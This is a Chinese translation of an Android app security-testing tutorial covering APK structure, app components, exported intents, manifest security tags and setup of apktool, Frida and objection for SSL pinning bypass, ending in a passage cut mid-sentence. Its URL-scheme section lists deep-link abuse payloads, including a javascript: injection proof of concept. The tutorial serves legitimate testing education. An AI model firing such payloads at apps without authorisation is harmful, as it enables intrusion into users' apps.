<html>
<head>
<title>Android App Security &amp; Testing</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Android应用安全性和测试</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/android-app-security-testing-156a052ce7e8?source=collection_archive---------0-----------------------#2020-07-31">https://infosecwriteups.com/android-app-security-testing-156a052ce7e8?source=collection_archive---------0-----------------------#2020-07-31</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="5801" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">#android #findBugs</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/346ffe6e9afb01a0ae631f6c16bb08df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*JjVOOyZ0aysMptLX.png"/></div></div></figure><p id="7f39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我将讨论关于应用程序的静态分析，以及一些你应该研究的问题。</p><p id="5568" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您还将了解如何设置像mobsf、Frida和objection这样的工具来绕过SSL锁定。</p><p id="63f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，让我们从一些</p><p id="6d17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">基本术语:</strong></p><ul class=""><li id="8855" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">Android应用程序采用的是APK文件格式。APK基本上是一个压缩文件。(您可以将文件扩展名重命名为。zip并使用unzip打开并查看其内容。)</li><li id="0e97" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">APK目录(此处仅列出少数)</li></ul><p id="d9bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-&gt; META-INF/:证书住在这里！</p><p id="362f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-&gt; classes . DEX:DEX文件格式的应用程序的Dalvik字节码。这是应用程序默认运行的Java(或Kotlin)代码。</p><p id="05f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">--&gt; lib/:默认情况下，应用程序的本地库位于此处！在lib/目录下，有特定于cpu的目录。</p><p id="f885" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">-&gt; armeabi</code>:仅针对所有基于ARM的处理器的编译代码</p><p id="2663" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">-&gt; armeabi-v7a</code>:仅针对所有基于ARMv7及更高版本处理器的编译代码</p><p id="46b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">-&gt; x86</code>:针对X86编译的代码</p><p id="2b86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lm ln lo lp b">-&gt; mips</code>:仅针对MIPS处理器的编译代码</p><p id="4709" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-&gt; assets/:应用程序可能需要的任何其他文件。</p><ul class=""><li id="5b7a" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">此处可能包含其他本地库或DEX文件。特别是当恶意软件作者试图通过不将额外的代码(本机或Dalvik)包含在默认位置来“隐藏”额外的代码时，这种情况就会发生。</li></ul><p id="d6ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-&gt; res/:包含未编译到resources.arsc中的资源的目录</p><p id="95aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-&gt; resources.arsc:包含预编译资源的文件，例如二进制XML。</p><p id="cb62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Activity- </strong>一个<em class="lg"> activity </em>是与用户交互的入口点。它代表具有用户界面(UI)的单个屏幕。活动为用户提供了与应用程序交互的界面，即查看屏幕上的内容并执行操作。</p><p id="8400" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大多数人认为<strong class="jp ir">启动器活动</strong>是Android应用程序的入口点。启动器活动是当用户单击应用程序的图标时启动的活动。您可以通过查看应用程序的清单来确定启动器的活动。启动器活动将列出以下<strong class="jp ir">主</strong>和<strong class="jp ir">启动器意图</strong>。</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="1c7e" class="lu lv iq lp b gy lw lx l ly lz">&lt;activity android:name=”.LauncherActivity”&gt;<br/> &lt;intent-filter&gt;<br/> &lt;action android:name=”android.intent.action.MAIN” /&gt;<br/> &lt;category android:name=”android.intent.category.LAUNCHER” /&gt;<br/> &lt;/intent-filter&gt;<br/>&lt;/activity&gt;</span></pre><p id="ded6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">服务</strong>—<em class="lg">服务</em>是一个通用的入口点，用于出于各种原因保持应用程序在后台运行。服务在后台执行操作，即后台同步、处理通知、播放音乐。服务没有用户界面。</p><p id="be7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可以导出服务，这允许设备上的其他进程启动该服务。默认情况下，不会导出服务，但可以在清单中进行配置:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="66be" class="lu lv iq lp b gy lw lx l ly lz">&lt;service android:name=".sampleExportedService" android:exported="true"/&gt;</span></pre><p id="1de9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">广播接收器-</strong><em class="lg">广播接收器</em>是一个组件，它使系统能够在常规用户流之外向应用程序交付事件，允许应用程序响应系统范围内的广播通知。这方面的一个例子是应用程序显示某些事件的通知，如警报、提醒、应用程序通知等。</p><p id="81f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">内容提供商- </strong>一个<em class="lg">内容提供商</em>根据请求从一个应用程序向其他应用程序提供数据。内容提供商可以以不同的格式存储数据，如文件、SQLite数据库，甚至可以通过网络获取数据。如果内容提供商允许，外部应用程序可以查询或修改数据。</p><p id="111a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它与数据库非常相似，有四种方法。</p><ul class=""><li id="f41a" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">插入()</li><li id="815e" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">更新()</li><li id="3316" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">删除()</li><li id="414c" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">查询()</li></ul><p id="7ffc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">导出的</strong> —表示服务是否可以被其他应用程序访问的属性</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="d664" class="lu lv iq lp b gy lw lx l ly lz">&lt;service android:name=”.sampleExportedService” android:exported=”true”/&gt;</span></pre><p id="c2c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">Intent-</strong>Intent是异步消息，在运行时将各个组件相互绑定。Intents允许与其他android组件进行交互。从上述组件中，可以使用<em class="lg">意图激活活动、服务和广播接收器。</em></p><h2 id="cae9" class="lu lv iq bd ma mb mc dn md me mf dp mg jy mh mi mj kc mk ml mm kg mn mo mp mq bi translated">意图过滤器</h2><p id="00a8" class="pw-post-body-paragraph jn jo iq jp b jq mr js jt ju ms jw jx jy mt ka kb kc mu ke kf kg mv ki kj kk ij bi translated">意图过滤器指定活动、服务或广播接收器可以响应的意图类型。</p><ul class=""><li id="bb5e" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">意图过滤器声明组件的能力。它指定了一个活动或服务可以做什么，以及接收机可以处理什么类型的广播。</li><li id="3e50" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">它允许相应的组件接收声明类型的意图。</li><li id="32aa" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">IntentFilters通常通过AndroidManifest.xml文件定义。</li><li id="67a0" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">对于BroadcastReceiver，也可以在编码中定义它们。IntentFilters由其类别、操作和数据过滤器定义。它还可以包含额外的元数据。</li><li id="fe56" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">如果任何组件是公共的，则可以从安装在同一设备上的另一个应用程序访问它。</li><li id="2e47" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">在Android中，当exported设置为true时，活动/服务/内容提供者/广播接收者是<strong class="jp ir">公共的</strong>，但是如果<strong class="jp ir">清单为其指定了意图过滤器</strong>，则组件也是公共的。</li><li id="5556" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">然而，开发人员可以通过将清单文件中每个组件的<strong class="jp ir">“exported”属性设置为false </strong>来<strong class="jp ir">显式地使组件私有</strong>(不考虑任何意图过滤器)。开发人员还可以设置“permission”属性来要求访问每个组件的特定权限，从而限制对组件的访问。</li><li id="f556" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">使用<code class="fe lm ln lo lp b">android:permission</code>属性应用于清单中的<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/guide/topics/manifest/activity-element" rel="noopener ugc nofollow" target="_blank">&lt;activity&gt;</a></code>标签或其他标签的权限限制了谁可以启动那个<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/android/app/Activity" rel="noopener ugc nofollow" target="_blank">Activity</a></code>。在<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/android/content/Context#startActivity(android.content.Intent)" rel="noopener ugc nofollow" target="_blank">Context.startActivity()</a></code>和<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/android/app/Activity#startActivityForResult(android.content.Intent,%20int)" rel="noopener ugc nofollow" target="_blank">Activity.startActivityForResult()</a></code>期间检查许可。如果呼叫者没有所需的许可，那么<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/java/lang/SecurityException" rel="noopener ugc nofollow" target="_blank">SecurityException</a></code>被从呼叫中抛出。</li></ul><h2 id="7122" class="lu lv iq bd ma mb mc dn md me mf dp mg jy mh mi mj kc mk ml mm kg mn mo mp mq bi translated">URL方案—</h2><p id="c498" class="pw-post-body-paragraph jn jo iq jp b jq mr js jt ju ms jw jx jy mt ka kb kc mu ke kf kg mv ki kj kk ij bi translated">一个应用程序可以在一个活动中声明一个<strong class="jp ir"> URL模式</strong>，这样每当Android设备试图<strong class="jp ir">使用该模式</strong>访问一个地址时，应用程序活动将被调用:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/92d56d78edd638e39419bafc8d755689.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/0*oiFpYQCski9kbtXh"/></div></figure><p id="ae4f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本例中的方案在<code class="fe lm ln lo lp b">myapp://</code></p><p id="5364" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果在<code class="fe lm ln lo lp b">intent-filter</code>里面你发现了这样的东西:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi my"><img src="../Images/387f9256f937bdeb3306e9f3a9bbc930.png" data-original-src="https://miro.medium.com/v2/resize:fit:824/0*eRbu3QSsXOO37bP0"/></div></figure><p id="1e75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，它期待类似<code class="fe lm ln lo lp b"><a class="ae mw" href="http://www.example.com/gizmos" rel="noopener ugc nofollow" target="_blank">http://www.example.com/gizmos</a></code>的东西</p><p id="c58f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您发现类似这样的情况:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/fd943c1f264c12ea12f8bcd90eea4099.png" data-original-src="https://miro.medium.com/v2/resize:fit:684/0*AXzHyf68TKxsTMTZ"/></div></figure><p id="3c84" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着它期待一个以<code class="fe lm ln lo lp b">example://gizmos</code>开头的URL，在这种情况下，你可以尝试滥用这个功能，用下面的有效载荷创建一个web。它将尝试导航到任意页面并尝试执行JS:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="7dd2" class="lu lv iq lp b gy lw lx l ly lz">&lt;a href="example://gizmos/https://google.com"&gt;click here&lt;/a&gt;</span><span id="d0e9" class="lu lv iq lp b gy na lx l ly lz">&lt;a href="example://gizmos/javascript://%250dalert(1)"&gt;click here&lt;/a&gt;</span></pre><h1 id="396f" class="nb lv iq bd ma nc nd ne md nf ng nh mg ni nj nk mj nl nm nn mm no np nq mp nr bi translated">我们如何开始每一个呢？</h1><ul class=""><li id="c4c3" class="kx ky iq jp b jq mr ju ms jy ns kc nt kg nu kk lc ld le lf bi translated">可以通过向<em class="lg"> startActivity() </em>方法传递一个<em class="lg">意图</em>来启动活动。</li><li id="5cf2" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">您可以通过将一个<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/android/content/Intent" rel="noopener ugc nofollow" target="_blank">Intent</a></code>传递给<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/android/content/Context#startService(android.content.Intent)" rel="noopener ugc nofollow" target="_blank">startService()</a></code>或<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/android/content/Context#startForegroundService(android.content.Intent)" rel="noopener ugc nofollow" target="_blank">startForegroundService()</a></code>，从一个活动或其他应用程序组件中启动一个服务。Android系统调用服务的<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/android/app/Service#onStartCommand(android.content.Intent,%20int,%20int)" rel="noopener ugc nofollow" target="_blank">onStartCommand()</a></code>方法并传递给它<code class="fe lm ln lo lp b"><a class="ae mw" href="https://developer.android.com/reference/android/content/Intent" rel="noopener ugc nofollow" target="_blank">Intent</a></code>，它指定启动哪个服务。</li><li id="a50a" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">当调用<code class="fe lm ln lo lp b">startService</code> API启动服务时，服务中的<code class="fe lm ln lo lp b">onStart</code>方法被执行</li><li id="25ca" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">您可以通过将<em class="lg"> Intent </em>传递给诸如<em class="lg"> sendBroadcast()、sendOrderedBroadcast()之类的方法来启动广播。</em></li><li id="56fc" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">一个应用程序可以通过两种方式注册一个广播接收器:在应用程序的清单中使用intents或者在应用程序的代码中使用<code class="fe lm ln lo lp b">registerReceiver()</code> API调用动态注册。</li></ul><p id="9d80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当发送接收器注册的特定广播时，执行BroadcastReceiver类中的<code class="fe lm ln lo lp b">onReceive method</code>。</p><ul class=""><li id="2aab" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">您可以通过在<em class="lg"> ContentResolver() </em>上调用<em class="lg"> query() </em>来执行对内容提供商的查询。</li></ul><div class="nv nw gp gr nx ny"><a href="https://medium.com/@nallamuthu/android-broadcast-exploit-34954205b5fb" rel="noopener follow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">Android广播漏洞</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">如何在Android应用程序中利用导出的广播接收器？</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">medium.com</p></div></div><div class="oh l"><div class="oi l oj ok ol oh om kv ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://resources.infosecinstitute.com/android-hacking-security-part-3-exploiting-broadcast-receivers/#gref" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">Android黑客和安全，第3部分:利用广播接收器</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">在前两篇文章中，我们讨论了与活动组件、内容提供者泄漏和…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">resources.infosecinstitute.com</p></div></div><div class="oh l"><div class="on l oj ok ol oh om kv ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://manifestsecurity.com/android-application-security/" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">安卓应用安全系列</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">欢迎来到Android应用安全系列。这个系列包含了一些关于不同类型的…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">manifestsecurity.com</p></div></div><div class="oh l"><div class="oo l oj ok ol oh om kv ny"/></div></div></a></div><h1 id="a40b" class="nb lv iq bd ma nc nd ne md nf ng nh mg ni nj nk mj nl nm nn mm no np nq mp nr bi translated">AndroidManifest.xml</h1><p id="0748" class="pw-post-body-paragraph jn jo iq jp b jq mr js jt ju ms jw jx jy mt ka kb kc mu ke kf kg mv ki kj kk ij bi translated">每个应用程序必须在其根目录中有一个<strong class="jp ir"> AndroidManifest.xml(与此处给出的名称完全相同)</strong>文件。清单向Android系统提供了关于应用程序的基本信息，这些信息是系统在运行任何应用程序代码之前必须拥有的。</p><p id="3bb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用apktool或mobsf获得这个文件</p><p id="f313" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令:apktool d sample-app.apk</p><p id="61a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">与安全相关的标签</strong></p><ol class=""><li id="c922" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk op ld le lf bi translated"><strong class="jp ir">&lt;Android:sharedUserId&gt;</strong><br/>将与其他应用程序共享的Linux用户id的名称。默认情况下，Android会为每个应用程序分配一个唯一的用户id。但是，如果两个或更多应用程序的此属性设置为相同的值，它们将共享相同的ID，前提是它们也由相同的证书签名。<br/>具有相同用户ID的应用程序可以访问彼此的数据，如果需要，还可以在相同的进程中运行。</li></ol><p id="a219" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 2。&lt;用途-权限&gt;T7】</strong></p><p id="7ff7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请求应用程序必须被授予权限才能正常运行。权限是在应用程序安装时由用户授予的，而不是在它运行时授予的。<br/>语法:</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="bbd1" class="lu lv iq lp b gy lw lx l ly lz">&lt;uses-permission android:<a class="ae mw" href="http://developer.android.com/guide/topics/manifest/uses-permission-element.html#nm" rel="noopener ugc nofollow" target="_blank">name</a>="<em class="lg">string</em>" /&gt;</span></pre><p id="131c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> android:name </strong> <br/>权限名称，如“android.permission.CAMERA”或“Android . permission . read _ CONTACTS”</p><p id="8489" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 3。android:可调试的</strong> <br/>应用程序是否可以调试，即使是在用户模式下的设备上运行——如果可以，则为“真”，否则为“假”。默认值为“假”</p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="61fe" class="lu lv iq lp b gy lw lx l ly lz"><em class="lg">&lt;application</em></span><span id="b0bb" class="lu lv iq lp b gy na lx l ly lz"><em class="lg">android:debuggable=”false”</em></span><span id="cef1" class="lu lv iq lp b gy na lx l ly lz"><em class="lg">&lt;/application&gt;</em></span></pre><p id="ed66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 4。&lt;权限&gt; </strong> <br/>声明一个安全权限，可用于限制对该应用程序或其他应用程序的特定组件或功能的访问。您可以使用它来为您的应用程序定义您自己的权限。<br/> <strong class="jp ir">语法</strong></p><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="3e0a" class="lu lv iq lp b gy lw lx l ly lz">&lt;permission android:description=”string resource”<br/> android:icon=”drawable resource”<br/> android:label=”string resource”<br/> android:name=”string”<br/> android:permissionGroup=”string”<br/> android:protectionLevel=[“normal” | “dangerous” | <br/> “signature” | “signatureOrSystem”] /&gt;</span></pre><p id="58fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">Android:protection level</strong><br/>描述了权限中隐含的潜在风险，并指出系统在决定是否将权限授予请求权限的应用程序时应遵循的程序。</p><p id="0012" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Android应用程序必须请求权限才能访问敏感的用户数据(如联系人和短信)，以及某些系统功能(如摄像头和互联网)。根据功能的不同，系统可能会自动授予权限，也可能会提示用户批准请求。</p><p id="7754" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该值可以设置为下列字符串之一:<br/> <strong class="jp ir">【正常】:- </strong>默认值。一种低风险权限，允许请求应用程序访问独立的应用程序级功能，对其他应用程序、系统或使用的风险最小<br/> <strong class="jp ir">【危险】:</strong>——一种高风险权限，允许请求应用程序访问私人用户数据或控制可能对用户产生负面影响的设备。因为这种类型的权限会带来潜在的风险，所以系统可能不会自动将它授予请求应用程序。例如，应用程序请求的任何危险权限可能会显示给用户，并要求在进行<br/>“<strong class="jp ir">签名”之前进行确认:- </strong>只有在请求应用程序使用与声明该权限的应用程序相同的证书签名时，系统才会授予该权限。如果证书匹配，系统会自动授予权限，而不通知用户或要求用户明确批准</p><p id="571c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">同一个公司的两个应用应该用签名权限</strong><br/><strong class="jp ir">“signatureOrSystem”:-</strong>系统只授予Android系统映像中的应用的权限，或者使用与声明权限的应用相同的证书签名的应用。请避免使用此选项，因为无论应用程序安装在哪里，签名保护级别都应该足以满足大多数需求和工作。“signatureOrSystem”权限用于某些特殊情况，其中多个供应商将应用程序构建到系统映像中，并且需要显式共享特定功能，因为它们是一起构建的。</p><p id="4f1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">安卓沙盒</strong></p><p id="c413" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦安装在设备上，每个Android应用程序都存在于自己的安全沙箱中:—Android操作系统是一个多用户Linux系统，其中每个应用程序都是一个不同的用户。</p><ul class=""><li id="9956" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">默认情况下，系统会为每个应用程序分配一个唯一的Linux用户ID(该ID仅供系统使用，应用程序无法识别)。系统为应用程序中的所有文件设置权限，以便只有分配给该应用程序的用户ID才能访问它们。</li><li id="55e4" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">每个进程都有自己的虚拟机，所以一个应用程序的代码独立于其他应用程序运行。</li><li id="0b71" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk lc ld le lf bi translated">默认情况下，每个应用都在自己的Linux进程中运行。</li></ul><p id="3cb8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">准备连接&amp;设置基本工具</strong></p><ul class=""><li id="ffa3" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated"><strong class="jp ir">安装工具:</strong></li></ul><ol class=""><li id="c65f" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk op ld le lf bi translated">安装<a class="ae mw" href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html" rel="noopener ugc nofollow" target="_blank"> JAVA JDK </a>，需要jarsigner，确保jarsigner的路径在path变量中。</li><li id="0892" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">安装apk tool(【https://ibotpeaches.github.io/Apktool/install/】T2):apk tool用于拆解和修补android应用。它将给出smali代码以及可读AndroidManifest.xml文件。</li><li id="1f20" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">你需要安装<a class="ae mw" href="https://developer.android.com/studio" rel="noopener ugc nofollow" target="_blank"> Android SDK </a>来安装类似于<em class="lg"> adb </em>的工具，或者如果你不需要完整的Android Studio，你可以下载基本的Android命令行工具。确保将安装路径放在$PATH中，这样您就可以从任何地方访问这些工具。</li><li id="a04d" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">安装jd-gui(从<a class="ae mw" href="http://java-decompiler.github.io/" rel="noopener ugc nofollow" target="_blank">到这里</a>，这个工具会帮助你看到java源代码。</li><li id="1461" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">安装dex2jar(从<a class="ae mw" href="https://sourceforge.net/projects/dex2jar/" rel="noopener ugc nofollow" target="_blank">到这里</a>)，这将帮助您将classes.dex文件转换为jar文件，然后可以在jd-gui中打开。您可以将apk作为输入传递给此工具，或者将classes.dex文件作为输入。</li><li id="7872" class="kx ky iq jp b jq lh ju li jy lj kc lk kg ll kk op ld le lf bi translated">安装弗里达和异议(更多信息将在后面描述)</li></ol><pre class="km kn ko kp gt lq lp lr ls aw lt bi"><span id="11a7" class="lu lv iq lp b gy lw lx l ly lz">pip3 install frida-tools<br/>pip3 install objection</span><span id="949b" class="lu lv iq lp b gy na lx l ly lz">or for updating these tools:</span><span id="3803" class="lu lv iq lp b gy na lx l ly lz">pip3 install frida-tools --upgrade<br/>pip3 install objection --upgrade</span></pre><p id="6fec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:确保所有工具都在您的$PATH中</strong></p><ul class=""><li id="4ffd" class="kx ky iq jp b jq jr ju jv jy kz kc la kg lb kk lc ld le lf bi translated">从android Studio运行您的仿真器(<a class="ae mw" 